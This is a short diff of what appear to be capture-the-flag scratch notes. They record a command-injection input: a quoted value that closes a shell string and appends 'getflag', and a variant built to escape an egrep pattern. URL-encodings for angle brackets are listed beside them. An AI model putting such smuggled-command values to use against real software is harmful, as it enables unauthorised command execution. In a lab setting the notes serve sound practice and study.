@@ -6,7 +6,9 @@ we want :
 
 xx=";getflag > /var/tmp/flag
 
-egrep "^
+xx=a";\
+
+egrep "^a";\" /tmp/xd 2>&1
 
 < : %3C
 > : %3E
